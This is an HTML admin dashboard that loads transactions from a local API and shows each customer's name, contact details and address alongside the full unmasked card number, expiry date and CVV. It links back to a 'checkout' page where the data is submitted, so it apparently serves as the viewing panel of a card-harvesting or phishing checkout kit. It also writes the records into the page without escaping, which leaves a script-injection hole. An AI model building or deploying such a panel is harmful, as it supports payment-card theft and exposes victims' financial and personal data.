<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard | 3x3 Grid View</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    :root {
      --bg: #07090e;
      --card-bg: rgba(18, 22, 31, 0.85);
      --border: rgba(255, 255, 255, 0.12);
      --text: #ffffff;
      --text-dim: #8b949e;
      --danger: #ff4d4d;
      --accent: #ffffff;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; }
    body { background: var(--bg); color: var(--text); padding: 32px 20px; min-height: 100vh; }
    
    .container { max-width: 1200px; margin: 0 auto; }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
    .header h2 { font-size: 24px; font-weight: 700; }
    .btn-back { color: var(--text); text-decoration: none; border: 1px solid var(--border); padding: 10px 18px; border-radius: 8px; font-size: 13px; font-weight: 600; }

    /* 3x3 Grid Layout */
    .grid-container {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
    }
    @media (max-width: 900px) { .grid-container { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 600px) { .grid-container { grid-template-columns: 1fr; } }

    .transaction-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 20px;
      cursor: pointer;
      transition: all 0.2s ease;
      position: relative;
    }
    .transaction-card:hover {
      border-color: rgba(255,255,255,0.4);
      transform: translateY(-3px);
    }
    .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
    .card-id { font-family: monospace; font-size: 12px; background: rgba(255,255,255,0.08); padding: 2px 6px; border-radius: 4px; }
    .card-amount { font-size: 20px; font-weight: 700; color: #fff; margin-bottom: 8px; }
    .card-customer { font-size: 14px; font-weight: 600; }
    .card-email { font-size: 12px; color: var(--text-dim); margin-bottom: 14px; }
    .card-status { display: inline-block; font-size: 11px; font-weight: 700; color: var(--danger); background: rgba(255,77,77,0.15); padding: 4px 8px; border-radius: 4px; }

    /* Modal Overlay */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.85);
      backdrop-filter: blur(10px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 20px;
    }
    .modal-content {
      background: #12161f;
      border: 1px solid var(--border);
      border-radius: 16px;
      width: 100%;
      max-width: 550px;
      padding: 28px;
      max-height: 90vh;
      overflow-y: auto;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
    }
    .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 20px; }
    .modal-header h3 { font-size: 18px; font-weight: 700; }
    .close-btn { background: none; border: none; color: var(--text-dim); font-size: 24px; cursor: pointer; }
    .close-btn:hover { color: #fff; }

    .data-group { margin-bottom: 18px; }
    .data-group-title { font-size: 12px; text-transform: uppercase; color: var(--text-dim); letter-spacing: 0.5px; font-weight: 700; margin-bottom: 10px; border-bottom: 1px dashed var(--border); padding-bottom: 4px; }
    .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
    .data-label { color: var(--text-dim); }
    .data-value { font-weight: 600; color: #fff; word-break: break-all; text-align: right; }
    .highlight-value { color: #ff4d4d; font-family: monospace; font-size: 15px; }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <h2>Admin Transaction Portal (3x3 Grid)</h2>
      <a href="/" class="btn-back">← Back to Checkout</a>
    </div>

    <!-- 3x3 Grid Section -->
    <div class="grid-container" id="grid-container">
      <p style="color: var(--text-dim);">Loading transaction cards...</p>
    </div>
  </div>

  <!-- Detailed Modal Window -->
  <div class="modal-overlay" id="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Full Unmasked Transaction Record</h3>
        <button class="close-btn" onclick="closeModal()">&times;</button>
      </div>

      <div id="modal-body">
        <!-- Dynamic Raw Details Injected Here -->
      </div>
    </div>
  </div>

  <script>
    let globalTransactions = [];

    async function fetchTransactions() {
      try {
        const response = await fetch('/api/transactions');
        globalTransactions = await response.json();

        const gridContainer = document.getElementById('grid-container');

        if (!globalTransactions || globalTransactions.length === 0) {
          gridContainer.innerHTML = '<p style="color: var(--text-dim); grid-column: span 3; text-align: center; padding: 40px;">No transactions submitted yet. Submit data on checkout page.</p>';
          return;
        }

        gridContainer.innerHTML = globalTransactions.map((txn, index) => `
          <div class="transaction-card" onclick="openModal(${index})">
            <div class="card-top">
              <span class="card-id">${txn.id}</span>
              <span class="card-status">${txn.status}</span>
            </div>
            <div class="card-amount">$${txn.amount}</div>
            <div class="card-customer">${txn.full_name}</div>
            <div class="card-email">${txn.email}</div>
            <p style="font-size: 12px; color: var(--text-dim);">Click card to view full raw data →</p>
          </div>
        `).join('');

      } catch (err) {
        console.error('Error fetching data:', err);
        document.getElementById('grid-container').innerHTML = '<p style="color: red; grid-column: span 3;">Failed to load transactions.</p>';
      }
    }

    function openModal(index) {
      const txn = globalTransactions[index];
      const modalBody = document.getElementById('modal-body');

      modalBody.innerHTML = `
        <div class="data-group">
          <div class="data-group-title">Transaction Details</div>
          <div class="data-row"><span class="data-label">Transaction ID:</span><span class="data-value">${txn.id}</span></div>
          <div class="data-row"><span class="data-label">Timestamp:</span><span class="data-value">${txn.timestamp}</span></div>
          <div class="data-row"><span class="data-label">Amount:</span><span class="data-value">$${txn.amount}</span></div>
          <div class="data-row"><span class="data-label">Status:</span><span class="data-value" style="color:#ff4d4d;">${txn.status}</span></div>
        </div>

        <div class="data-group">
          <div class="data-group-title">Customer Information</div>
          <div class="data-row"><span class="data-label">Full Name:</span><span class="data-value">${txn.full_name}</span></div>
          <div class="data-row"><span class="data-label">Email:</span><span class="data-value">${txn.email}</span></div>
          <div class="data-row"><span class="data-label">Phone:</span><span class="data-value">${txn.phone}</span></div>
          <div class="data-row"><span class="data-label">Address:</span><span class="data-value">${txn.address}</span></div>
          <div class="data-row"><span class="data-label">Location:</span><span class="data-value">${txn.city}, ${txn.country}</span></div>
        </div>

        <div class="data-group">
          <div class="data-group-title">Full Raw Payment Details (Unmasked)</div>
          <div class="data-row"><span class="data-label">Card Type:</span><span class="data-value">${txn.card_type}</span></div>
          <div class="data-row"><span class="data-label">Card Holder:</span><span class="data-value">${txn.card_holder}</span></div>
          <div class="data-row"><span class="data-label">Card Number:</span><span class="data-value highlight-value">${txn.card_number}</span></div>
          <div class="data-row"><span class="data-label">Expiry Date:</span><span class="data-value highlight-value">${txn.expiry}</span></div>
          <div class="data-row"><span class="data-label">CVV / CVC:</span><span class="data-value highlight-value">${txn.cvv}</span></div>
        </div>
      `;

      document.getElementById('modal-overlay').style.display = 'flex';
    }

    function closeModal() {
      document.getElementById('modal-overlay').style.display = 'none';
    }

    fetchTransactions();
  </script>
</body>
</html>
